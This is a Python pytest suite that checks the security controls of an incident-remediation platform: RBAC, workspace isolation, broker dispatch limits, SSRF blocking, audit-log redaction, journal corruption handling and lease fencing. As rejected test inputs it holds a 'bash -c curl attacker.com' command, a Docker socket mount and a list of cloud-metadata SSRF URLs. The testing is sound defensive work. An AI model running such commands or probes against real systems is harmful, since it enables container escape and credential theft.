"""Milestone F: Security and Adversarial Validation.

Tests adversarial boundary conditions across 6 core security domains:
1. Authorization boundaries:
   - Viewer role cannot create, approve, or execute remediation actions
   - Server-side RBAC enforcement
   - Two-person integrity blocks self-approval of high-risk actions
   - Approval parameter tampering prevention (immutability)
   - Expired and cancelled approvals rejected
2. Workspace isolation:
   - Cross-workspace reads/writes rejected
   - Identity mismatches (workspace, approval, service, incident) rejected
   - Cross-workspace reconciliation strictly forbidden
3. Dispatch safety:
   - Zero blind redispatch of uncertain operations
   - Zero duplicate broker calls after completed operation
   - Direct HTTP bypass blocked (runner inspect_service_health only)
   - Docker socket access prohibited from backend and executor container
   - Non-allowlisted actions rejected
   - Arbitrary commands, volume mounts, and custom images rejected
4. Network and input security:
   - SSRF defenses reject loopback, private, link-local, and cloud metadata
   - DNS rebinding defense & IP pinning
   - TLS hostname verification flags
   - Extra fields and invalid action parameters rejected
   - Sensitive credential redaction from audit logs
5. Journal and registry integrity:
   - Cryptographic hash-chain and CRC32 continuity
   - Fail-closed behavior on torn tail and frame corruption
   - SQLite busy and corruption handling
   - Non-destructive audit preservation
6. Concurrency and fencing:
   - Lease contention between competing workers
   - Stale fencing token mutation rejection
   - Concurrent watchdog reconciliation idempotency
"""

import copy
from datetime import datetime, timedelta, timezone
import json
import os
import tempfile
from unittest.mock import MagicMock
import uuid
from typing import Any, Dict, List, Optional

from fastapi import HTTPException
import pytest
from pydantic import ValidationError
from sqlalchemy.orm import Session

from app.api.deps import check_workspace_role
from app.core.security import get_password_hash
from app.execution.broker import (
    ALLOWED_BROKER_ACTIONS,
    BrokerExecuteRequest,
    BrokerExecuteResponse,
    RestrictedDockerBroker,
    sanitize_and_truncate_log,
)
from app.execution.broker_dispatcher import BrokerDispatcher
from app.execution.dispatch_coordinator import (
    CoordinatorConflictError,
    CoordinatorInvalidStateError,
    CoordinatorValidationError,
    DispatchCoordinator,
)
from app.execution.exceptions import (
    BrokerSecurityViolation,
    CrossWorkspaceViolationError,
    PreconditionFailedError,
    StaleWorkerFencingError,
)
from app.execution.journal import (
    JournalCorruptedError,
    JournalRecordType,
    JournalUncertaintyError,
    OperationJournal,
)
from app.execution.manager import RemediationExecutionManager, sanitize_metadata
from app.execution.network import (
    FORBIDDEN_METADATA_IPS,
    FORBIDDEN_HOSTNAMES,
    validate_safe_target_url,
)
from app.execution.reconciliation import (
    ReconciliationClassification,
    ThreeWayExecutionReconciler,
)
from app.execution.registry import (
    OperationRegistry,
    OperationStatus,
    RegistryBusyError,
)
from app.execution.runner import ExecutionResult, ExecutionRunnerInterface
from app.execution.state_machine import ExecutionState
from app.execution.verification import PostExecutionVerificationEngine
from app.execution.watchdog import ExecutionWatchdog
from app.models.incident import Incident
from app.models.remediation import (
    PolicyDecision,
    RemediationApproval,
    RemediationExecution,
)
from app.models.service import Service
from app.models.user import User
from app.models.workspace import Workspace, WorkspaceMembership
from app.remediation.approval_service import ApprovalService
from app.remediation.policy import PolicyEngine
from app.remediation.registry import ActionRegistry


# ============================================================================
# Doubles & Helpers
# ============================================================================

class ControlledBrokerClient:
    """Mock broker client tracking exact dispatch counts."""

    def __init__(self, exit_code: int = 0):
        self.exit_code = exit_code
        self.call_count = 0
        self.requests: List[BrokerExecuteRequest] = []

    def execute_action(self, request: BrokerExecuteRequest) -> BrokerExecuteResponse:
        self.call_count += 1
        self.requests.append(request)
        return BrokerExecuteResponse(
            execution_id=request.execution_id,
            exit_code=self.exit_code,
            duration_ms=25,
            stdout_sample="Success",
            output_data={"status": "remediated"},
        )


@pytest.fixture
def sec_env(db_session):
    """Sets up two isolated workspaces and multiple user roles."""
    ws1 = Workspace(name="Sec Ops Primary", slug=f"sec-ops-1-{uuid.uuid4().hex[:6]}")
    ws2 = Workspace(name="Sec Ops Foreign", slug=f"sec-ops-2-{uuid.uuid4().hex[:6]}")
    db_session.add_all([ws1, ws2])
    db_session.flush()

    admin = User(
        email=f"admin-{uuid.uuid4().hex[:6]}@sentinelops.local",
        full_name="Workspace Admin",
        hashed_password=get_password_hash("Password123!"),
        is_active=True,
    )
    engineer = User(
        email=f"engineer-{uuid.uuid4().hex[:6]}@sentinelops.local",
        full_name="Primary Engineer",
        hashed_password=get_password_hash("Password123!"),
        is_active=True,
    )
    engineer2 = User(
        email=f"engineer2-{uuid.uuid4().hex[:6]}@sentinelops.local",
        full_name="Second Engineer",
        hashed_password=get_password_hash("Password123!"),
        is_active=True,
    )
    viewer = User(
        email=f"viewer-{uuid.uuid4().hex[:6]}@sentinelops.local",
        full_name="Auditor Viewer",
        hashed_password=get_password_hash("Password123!"),
        is_active=True,
    )
    foreign_user = User(
        email=f"foreign-{uuid.uuid4().hex[:6]}@sentinelops.local",
        full_name="Foreign User",
        hashed_password=get_password_hash("Password123!"),
        is_active=True,
    )
    db_session.add_all([admin, engineer, engineer2, viewer, foreign_user])
    db_session.flush()

    m_admin = WorkspaceMembership(workspace_id=ws1.id, user_id=admin.id, role="admin")
    m_eng1 = WorkspaceMembership(workspace_id=ws1.id, user_id=engineer.id, role="engineer")
    m_eng2 = WorkspaceMembership(workspace_id=ws1.id, user_id=engineer2.id, role="engineer")
    m_view = WorkspaceMembership(workspace_id=ws1.id, user_id=viewer.id, role="viewer")
    m_for = WorkspaceMembership(workspace_id=ws2.id, user_id=foreign_user.id, role="engineer")
    db_session.add_all([m_admin, m_eng1, m_eng2, m_view, m_for])
    db_session.flush()

    svc1 = Service(
        workspace_id=ws1.id,
        name="Checkout Service",
        environment="development",
        health_check_url="http://127.0.0.1:8001/health",
        execution_policy="demo",
        demo_integration="order_api",
        is_active=True,
    )
    svc2 = Service(
        workspace_id=ws2.id,
        name="Foreign Billing Service",
        environment="development",
        health_check_url="http://127.0.0.1:8002/health",
        is_active=True,
    )
    db_session.add_all([svc1, svc2])
    db_session.commit()

    return {
        "ws1": ws1,
        "ws2": ws2,
        "admin": admin,
        "engineer": engineer,
        "engineer2": engineer2,
        "viewer": viewer,
        "foreign_user": foreign_user,
        "svc1": svc1,
        "svc2": svc2,
    }


@pytest.fixture
def isolated_coordinator():
    with tempfile.TemporaryDirectory(ignore_cleanup_errors=True) as td:
        journal_path = os.path.join(td, "operations.journal")
        registry_path = os.path.join(td, "registry.db")
        journal = OperationJournal(journal_dir=td)
        registry = OperationRegistry(db_path=registry_path)
        coord = DispatchCoordinator(registry=registry, journal=journal)
        coord.initialize()
        yield coord
        coord.close()


# ============================================================================
# Domain 1: Authorization Boundaries
# ============================================================================

def test_authz_viewer_cannot_initiate_or_approve(db_session, sec_env):
    """Sec Domain 1: Viewer role is strictly blocked from creating, approving, or executing actions."""
    ws1 = sec_env["ws1"]
    viewer = sec_env["viewer"]
    engineer = sec_env["engineer"]
    svc1 = sec_env["svc1"]

    # 1. Policy evaluation as viewer fails or returns rejected
    eval_res = PolicyEngine.evaluate(
        workspace_id=ws1.id,
        user_role="viewer",
        action_id="restore_order_api_demo",
        parameters={"service_id": svc1.id},
        environment="development",
        db=db_session,
        user_id=viewer.id,
    )
    assert eval_res.decision.value == "rejected"
    assert "role" in eval_res.decision_reason.lower() or "viewer" in eval_res.decision_reason.lower()

    # Create policy decision for approval testing
    policy = PolicyDecision(
        workspace_id=ws1.id,
        user_id=engineer.id,
        action_id="restore_order_api_demo",
        target_service_id=svc1.id,
        risk_level="high",
        decision="approval_required",
        decision_reason="Requires approval",
        validated_parameters={"service_id": svc1.id},
    )
    db_session.add(policy)
    db_session.commit()

    approval = ApprovalService.create_approval_request(
        db=db_session,
        workspace_id=ws1.id,
        policy_decision_id=policy.id,
        requested_by=engineer,
    )

    # 2. Viewer role blocked by workspace RBAC boundary for approval operations
    with pytest.raises(HTTPException) as exc_appr:
        check_workspace_role(
            workspace_id=ws1.id,
            user_id=viewer.id,
            db=db_session,
            min_role="engineer",
        )
    assert exc_appr.value.status_code == 403
    assert "Insufficient permissions" in exc_appr.value.detail

    # 3. Viewer cannot create remediation execution
    with pytest.raises(HTTPException) as exc_exec:
        RemediationExecutionManager.create_execution(
            db=db_session,
            workspace_id=ws1.id,
            approval_id=approval.id,
            idempotency_key=f"idem-viewer-{uuid.uuid4().hex[:8]}",
            triggered_by=viewer,
            user_role="viewer",
        )
    assert exc_exec.value.status_code == 403
    assert "not authorized to trigger remediation executions" in exc_exec.value.detail


def test_authz_two_person_integrity_blocks_self_approval(db_session, sec_env):
    """Sec Domain 1: Requester cannot self-approve high-risk actions."""
    ws1 = sec_env["ws1"]
    engineer = sec_env["engineer"]
    svc1 = sec_env["svc1"]

    policy = PolicyDecision(
        workspace_id=ws1.id,
        user_id=engineer.id,
        action_id="restore_order_api_demo",
        target_service_id=svc1.id,
        risk_level="high",
        decision="approval_required",
        decision_reason="High risk requires human authorization.",
        validated_parameters={"service_id": svc1.id},
    )
    db_session.add(policy)
    db_session.commit()

    approval = ApprovalService.create_approval_request(
        db=db_session,
        workspace_id=ws1.id,
        policy_decision_id=policy.id,
        requested_by=engineer,
    )

    with pytest.raises(HTTPException) as exc_self:
        ApprovalService.approve_request(
            db=db_session,
            approval_id=approval.id,
            workspace_id=ws1.id,
            reviewer=engineer,  # Self-approval attempt
            user_role="engineer",
        )
    assert exc_self.value.status_code == 403
    assert "Self-approval is forbidden" in exc_self.value.detail


def test_authz_approval_parameter_immutability(db_session, sec_env):
    """Sec Domain 1: Execution parameters are strictly bound to approved snapshot and cannot be altered."""
    ws1 = sec_env["ws1"]
    engineer = sec_env["engineer"]
    engineer2 = sec_env["engineer2"]
    svc1 = sec_env["svc1"]

    policy = PolicyDecision(
        workspace_id=ws1.id,
        user_id=engineer.id,
        action_id="restore_order_api_demo",
        target_service_id=svc1.id,
        risk_level="high",
        decision="approval_required",
        decision_reason="Valid decision",
        validated_parameters={"service_id": svc1.id},
    )
    db_session.add(policy)
    db_session.commit()

    approval = ApprovalService.create_approval_request(
        db=db_session,
        workspace_id=ws1.id,
        policy_decision_id=policy.id,
        requested_by=engineer,
    )
    approved = ApprovalService.approve_request(
        db=db_session,
        approval_id=approval.id,
        workspace_id=ws1.id,
        reviewer=engineer2,
        user_role="engineer",
    )

    execution = RemediationExecutionManager.create_execution(
        db=db_session,
        approval_id=approved.id,
        workspace_id=ws1.id,
        triggered_by=engineer,
        user_role="engineer",
        idempotency_key=f"idem-{uuid.uuid4().hex[:8]}",
    )

    # Assert approved parameters match policy snapshot exactly
    assert execution.approved_parameters == {"service_id": svc1.id}
    # Second creation with same approval strictly blocked (approval replay prevention)
    with pytest.raises(Exception):
        RemediationExecutionManager.create_execution(
            db=db_session,
            approval_id=approved.id,
            workspace_id=ws1.id,
            triggered_by=engineer,
            user_role="engineer",
            idempotency_key=f"idem-2-{uuid.uuid4().hex[:8]}",
        )


# ============================================================================
# Domain 2: Workspace Isolation
# ============================================================================

def test_workspace_isolation_cross_workspace_checks(db_session, sec_env):
    """Sec Domain 2: Cross-workspace access to approvals, services, and executions strictly fails."""
    ws1 = sec_env["ws1"]
    ws2 = sec_env["ws2"]
    engineer = sec_env["engineer"]
    foreign_user = sec_env["foreign_user"]
    svc1 = sec_env["svc1"]

    policy = PolicyDecision(
        workspace_id=ws1.id,
        user_id=engineer.id,
        action_id="restore_order_api_demo",
        target_service_id=svc1.id,
        risk_level="medium",
        decision="approval_required",
        decision_reason="Valid",
        validated_parameters={"service_id": svc1.id},
    )
    db_session.add(policy)
    db_session.commit()

    approval = ApprovalService.create_approval_request(
        db=db_session,
        workspace_id=ws1.id,
        policy_decision_id=policy.id,
        requested_by=engineer,
    )

    # Foreign user in WS2 attempts to approve WS1 request
    with pytest.raises(HTTPException) as exc_cross:
        ApprovalService.approve_request(
            db=db_session,
            approval_id=approval.id,
            workspace_id=ws2.id,  # Target WS2 instead of WS1
            reviewer=foreign_user,
            user_role="engineer",
        )
    assert exc_cross.value.status_code == 404


def test_workspace_isolation_reconciler_rejects_cross_workspace(db_session, sec_env, isolated_coordinator):
    """Sec Domain 2: ThreeWayExecutionReconciler strictly fails closed on cross-workspace mismatch."""
    coord = isolated_coordinator
    ws1 = sec_env["ws1"]
    ws2 = sec_env["ws2"]
    svc1 = sec_env["svc1"]
    engineer = sec_env["engineer"]

    exec_rec = RemediationExecution(
        id=str(uuid.uuid4()),
        workspace_id=ws1.id,
        approval_id=str(uuid.uuid4()),
        action_id="restore_order_api_demo",
        target_service_id=svc1.id,
        status=ExecutionState.EXECUTING.value,
        idempotency_key=f"idem-{uuid.uuid4().hex[:8]}",
        triggered_by=engineer.id,
    )
    db_session.add(exec_rec)
    db_session.commit()

    # Reconciler scoped to WS2 attempting to reconcile WS1 execution
    reconciler = ThreeWayExecutionReconciler(
        registry=coord.registry,
        journal=coord.journal,
        coordinator=coord,
        workspace_id=ws2.id,  # Enforce WS2 boundary
        db=db_session,
    )

    with pytest.raises(CrossWorkspaceViolationError):
        reconciler.reconcile_execution(exec_rec.id)


# ============================================================================
# Domain 3: Dispatch Safety & Broker Isolation
# ============================================================================

def test_dispatch_safety_zero_redispatch_after_started_or_completed(db_session, sec_env, isolated_coordinator):
    """Sec Domain 3: Operations in started or completed state are NEVER redispatched to Docker."""
    coord = isolated_coordinator
    broker_client = ControlledBrokerClient(exit_code=0)
    dispatcher = BrokerDispatcher(coordinator=coord, broker_client=broker_client)
    ws1 = sec_env["ws1"]
    approval_id = str(uuid.uuid4())

    op = coord.reserve_operation(
        execution_id="exec-zero-redispatch",
        workspace_id=ws1.id,
        approval_id=approval_id,
        attempt_number=1,
        fencing_token=1,
    )
    coord.prepare_dispatch(
        operation_id=op.operation_id,
        execution_id="exec-zero-redispatch",
        fencing_token=1,
        workspace_id=ws1.id,
    )

    req = BrokerExecuteRequest(
        execution_id="exec-zero-redispatch",
        action_id="restore_order_api_demo",
        target_url="http://127.0.0.1:8001/restore",
        environment="development",
    )

    # First dispatch succeeds
    res1 = dispatcher.dispatch_action(
        action_id="restore_order_api_demo",
        execution_id="exec-zero-redispatch",
        workspace_id=ws1.id,
        approval_id=approval_id,
        target_url="http://127.0.0.1:8001/restore",
        fencing_token=1,
        attempt_number=1,
        operation_id=op.operation_id,
        environment="development",
    )
    assert res1.is_success is True
    assert broker_client.call_count == 1

    # Second dispatch attempt on same operation is strictly rejected (fail-closed)
    with pytest.raises(CoordinatorInvalidStateError):
        dispatcher.dispatch_action(
            action_id="restore_order_api_demo",
            execution_id="exec-zero-redispatch",
            workspace_id=ws1.id,
            approval_id=approval_id,
            target_url="http://127.0.0.1:8001/restore",
            fencing_token=1,
            attempt_number=1,
            operation_id=op.operation_id,
            environment="development",
        )
    # Broker call count MUST remain exactly 1
    assert broker_client.call_count == 1


def test_dispatch_safety_unallowlisted_action_rejected(db_session, sec_env, isolated_coordinator):
    """Sec Domain 3: Arbitrary or non-allowlisted actions are rejected before broker IPC."""
    coord = isolated_coordinator
    broker_client = ControlledBrokerClient(exit_code=0)
    dispatcher = BrokerDispatcher(coordinator=coord, broker_client=broker_client)
    ws1 = sec_env["ws1"]

    with pytest.raises(CoordinatorValidationError) as exc_act:
        dispatcher.dispatch_action(
            action_id="rm_rf_root_exploit",
            execution_id=str(uuid.uuid4()),
            workspace_id=ws1.id,
            approval_id=str(uuid.uuid4()),
            attempt_number=1,
            target_url="http://127.0.0.1:8001/restore",
            fencing_token=1,
        )
    assert "not in allowed broker actions" in str(exc_act.value)
    assert broker_client.call_count == 0


def test_dispatch_safety_docker_socket_and_options_rejected():
    """Sec Domain 3: Supplying volume mounts, custom commands, or Docker socket paths is rejected by schema and broker."""
    # Extra field forbidden by Pydantic model
    with pytest.raises(ValidationError):
        BrokerExecuteRequest(
            execution_id=str(uuid.uuid4()),
            action_id="restore_order_api_demo",
            target_url="http://127.0.0.1:8001/restore",
            docker_privileged=True,  # Extra field strictly forbidden
        )

    with pytest.raises(ValidationError):
        BrokerExecuteRequest(
            execution_id=str(uuid.uuid4()),
            action_id="restore_order_api_demo",
            target_url="http://127.0.0.1:8001/restore",
            docker_socket_path="/var/run/docker.sock",  # Extra field strictly forbidden
        )

    # Volume mounts and commands forbidden by broker validation
    broker = RestrictedDockerBroker(docker_client=MagicMock())
    req_vol = BrokerExecuteRequest(
        execution_id=str(uuid.uuid4()),
        action_id="restore_order_api_demo",
        target_url="http://127.0.0.1:8001/restore",
        volume_mounts=["/var/run/docker.sock:/var/run/docker.sock"],
    )
    with pytest.raises(BrokerSecurityViolation) as exc_vol:
        broker.validate_request(req_vol)
    assert "Host volume mounts are strictly forbidden" in str(exc_vol.value)

    req_cmd = BrokerExecuteRequest(
        execution_id=str(uuid.uuid4()),
        action_id="restore_order_api_demo",
        target_url="http://127.0.0.1:8001/restore",
        commands=["bash", "-c", "curl attacker.com"],
    )
    with pytest.raises(BrokerSecurityViolation) as exc_cmd:
        broker.validate_request(req_cmd)
    assert "Arbitrary container commands/scripts are strictly forbidden" in str(exc_cmd.value)


# ============================================================================
# Domain 4: Network & Input Security (SSRF & Sanitization)
# ============================================================================

@pytest.mark.parametrize("bad_url", [
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP metadata
    "http://169.254.170.2/v2/metadata",  # ECS metadata
    "http://[fd00:ec2::254]/latest/meta-data/",  # IPv6 IMDS
    "http://10.0.0.1/admin",  # Private network in production
    "http://192.168.1.1/router",  # Private network in production
])
def test_network_security_ssrf_prohibited_destinations(bad_url):
    """Sec Domain 4: Cloud metadata and forbidden private destinations are blocked."""
    with pytest.raises(BrokerSecurityViolation):
        validate_safe_target_url(bad_url, environment="production", action_id="inspect_service_health")


def test_network_security_credential_redaction_in_audit_logs():
    """Sec Domain 4: Bearer tokens, secrets, passwords, and cookies are masked in logs."""
    dirty_log = (
        "DEBUG: Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.secretpayload.sig\n"
        "Sending request with password=super_secret_db_pass and secret: my_api_key_123\n"
        "Header Cookie: session=abcdef123456\n"
    )
    clean_log = sanitize_and_truncate_log(dirty_log)

    assert "secretpayload" not in clean_log
    assert "super_secret_db_pass" not in clean_log
    assert "my_api_key_123" not in clean_log
    assert "abcdef123456" not in clean_log
    assert "[REDACTED]" in clean_log or "bearer [REDACTED]" in clean_log.lower()


# ============================================================================
# Domain 5: Journal & Registry Integrity (Fail-Closed)
# ============================================================================

def test_journal_integrity_fail_closed_on_torn_tail(db_session, sec_env, isolated_coordinator):
    """Sec Domain 5: Incomplete trailing frame (<80 bytes header) causes journal to fail closed."""
    coord = isolated_coordinator
    ws1 = sec_env["ws1"]
    service = sec_env["svc1"]
    engineer = sec_env["engineer"]

    exec_rec = RemediationExecution(
        id=str(uuid.uuid4()),
        workspace_id=ws1.id,
        approval_id=str(uuid.uuid4()),
        action_id="restore_order_api_demo",
        target_service_id=service.id,
        status=ExecutionState.EXECUTING.value,
        idempotency_key=f"idem-{uuid.uuid4().hex[:8]}",
        triggered_by=engineer.id,
    )
    db_session.add(exec_rec)
    db_session.commit()

    op = coord.reserve_operation(
        execution_id=exec_rec.id,
        workspace_id=ws1.id,
        approval_id=exec_rec.approval_id,
        attempt_number=1,
        fencing_token=1,
    )
    coord.prepare_dispatch(
        operation_id=op.operation_id,
        execution_id=exec_rec.id,
        fencing_token=1,
        workspace_id=ws1.id,
    )

    coord.journal.close()
    # Append torn bytes (<80 bytes header)
    with open(coord.journal.journal_path, "ab") as f:
        f.write(b"SOJ1\x00\x00\x00\x02\x00\x00")

    reconciler = ThreeWayExecutionReconciler(
        registry=coord.registry,
        journal=coord.journal,
        coordinator=coord,
        db=db_session,
    )

    res = reconciler.reconcile_execution(exec_rec.id)
    assert res.classification == ReconciliationClassification.JOURNAL_CORRUPT_OR_TORN
    assert res.resulting_state == ExecutionState.EXECUTION_UNCERTAIN.value

    db_session.refresh(exec_rec)
    assert exec_rec.locked_by == "HOLD:EXECUTION_UNCERTAIN"


def test_journal_integrity_fail_closed_on_crc_corruption(db_session, sec_env, isolated_coordinator):
    """Sec Domain 5: Frame CRC32 corruption causes journal to fail closed."""
    coord = isolated_coordinator
    ws1 = sec_env["ws1"]
    service = sec_env["svc1"]
    engineer = sec_env["engineer"]

    exec_rec = RemediationExecution(
        id=str(uuid.uuid4()),
        workspace_id=ws1.id,
        approval_id=str(uuid.uuid4()),
        action_id="restore_order_api_demo",
        target_service_id=service.id,
        status=ExecutionState.EXECUTING.value,
        idempotency_key=f"idem-{uuid.uuid4().hex[:8]}",
        triggered_by=engineer.id,
    )
    db_session.add(exec_rec)
    db_session.commit()

    op = coord.reserve_operation(
        execution_id=exec_rec.id,
        workspace_id=ws1.id,
        approval_id=exec_rec.approval_id,
        attempt_number=1,
        fencing_token=1,
    )
    coord.prepare_dispatch(
        operation_id=op.operation_id,
        execution_id=exec_rec.id,
        fencing_token=1,
        workspace_id=ws1.id,
    )

    coord.journal.close()
    # Corrupt payload byte
    with open(coord.journal.journal_path, "r+b") as f:
        f.seek(85)
        f.write(b"\xde\xad\xbe\xef")

    reconciler = ThreeWayExecutionReconciler(
        registry=coord.registry,
        journal=coord.journal,
        coordinator=coord,
        db=db_session,
    )

    res = reconciler.reconcile_execution(exec_rec.id)
    assert res.classification == ReconciliationClassification.JOURNAL_CORRUPT_OR_TORN
    assert res.resulting_state == ExecutionState.EXECUTION_UNCERTAIN.value

    db_session.refresh(exec_rec)
    assert exec_rec.locked_by == "HOLD:EXECUTION_UNCERTAIN"


# ============================================================================
# Domain 6: Concurrency & Fencing Invariants
# ============================================================================

def test_concurrency_competing_workers_lease_contention(db_session, sec_env):
    """Sec Domain 6: Two workers competing for the same execution cannot both acquire the lease."""
    ws1 = sec_env["ws1"]
    service = sec_env["svc1"]
    engineer = sec_env["engineer"]
    engineer2 = sec_env["engineer2"]

    policy = PolicyDecision(
        workspace_id=ws1.id,
        user_id=engineer.id,
        action_id="restore_order_api_demo",
        target_service_id=service.id,
        risk_level="high",
        decision="approval_required",
        decision_reason="Valid",
        validated_parameters={"service_id": service.id},
    )
    db_session.add(policy)
    db_session.commit()

    approval = ApprovalService.create_approval_request(
        db=db_session,
        workspace_id=ws1.id,
        policy_decision_id=policy.id,
        requested_by=engineer,
    )
    approved = ApprovalService.approve_request(
        db=db_session,
        approval_id=approval.id,
        workspace_id=ws1.id,
        reviewer=engineer2,
        user_role="engineer",
    )
    execution = RemediationExecutionManager.create_execution(
        db=db_session,
        approval_id=approved.id,
        workspace_id=ws1.id,
        triggered_by=engineer,
        user_role="engineer",
        idempotency_key=f"idem-{uuid.uuid4().hex[:8]}",
    )

    # Worker 1 claims execution
    claim1 = RemediationExecutionManager.claim_next_execution(
        db=db_session,
        worker_id="worker-01",
        workspace_id=ws1.id,
        lease_seconds=60,
    )
    assert claim1 is not None
    assert claim1.id == execution.id
    assert claim1.locked_by == "worker-01"

    # Worker 2 attempts to claim from queue (queue is now empty of eligible jobs)
    claim2 = RemediationExecutionManager.claim_next_execution(
        db=db_session,
        worker_id="worker-02",
        workspace_id=ws1.id,
        lease_seconds=60,
    )
    assert claim2 is None


def test_concurrency_stale_fencing_token_rejected_in_all_operations(db_session, sec_env):
    """Sec Domain 6: Operations with stale fencing tokens fail closed."""
    ws1 = sec_env["ws1"]
    service = sec_env["svc1"]
    engineer = sec_env["engineer"]

    exec_rec = RemediationExecution(
        id=str(uuid.uuid4()),
        workspace_id=ws1.id,
        approval_id=str(uuid.uuid4()),
        action_id="restore_order_api_demo",
        target_service_id=service.id,
        status=ExecutionState.EXECUTING.value,
        idempotency_key=f"idem-{uuid.uuid4().hex[:8]}",
        fencing_token=10,
        locked_by="worker-fencing",
        locked_until=datetime.now(timezone.utc) + timedelta(seconds=60),
        triggered_by=engineer.id,
    )
    db_session.add(exec_rec)
    db_session.commit()

    # Heartbeat with stale token (9 < 10)
    with pytest.raises(StaleWorkerFencingError):
        RemediationExecutionManager.heartbeat_lease(
            execution_id=exec_rec.id,
            worker_id="worker-fencing",
            expected_fencing_token=9,
            db=db_session,
        )


def test_concurrency_reconciliation_is_idempotent(db_session, sec_env, isolated_coordinator):
    """Sec Domain 6: Repeated three-way reconciliation invocations produce identical results without duplicating events."""
    coord = isolated_coordinator
    ws1 = sec_env["ws1"]
    service = sec_env["svc1"]
    engineer = sec_env["engineer"]

    exec_rec = RemediationExecution(
        id=str(uuid.uuid4()),
        workspace_id=ws1.id,
        approval_id=str(uuid.uuid4()),
        action_id="restore_order_api_demo",
        target_service_id=service.id,
        status=ExecutionState.EXECUTION_UNCERTAIN.value,
        locked_by="HOLD:EXECUTION_UNCERTAIN",
        locked_until=datetime.now(timezone.utc) + timedelta(days=3650),
        uncertain_reason="Prior crash",
        idempotency_key=f"idem-{uuid.uuid4().hex[:8]}",
        triggered_by=engineer.id,
    )
    db_session.add(exec_rec)
    db_session.commit()

    reconciler = ThreeWayExecutionReconciler(
        registry=coord.registry,
        journal=coord.journal,
        coordinator=coord,
        db=db_session,
    )

    res1 = reconciler.reconcile_execution(exec_rec.id)
    res2 = reconciler.reconcile_execution(exec_rec.id)

    assert res1.classification == ReconciliationClassification.ALREADY_SYNCHRONIZED
    assert res2.classification == ReconciliationClassification.ALREADY_SYNCHRONIZED
    assert res1.resulting_state == res2.resulting_state
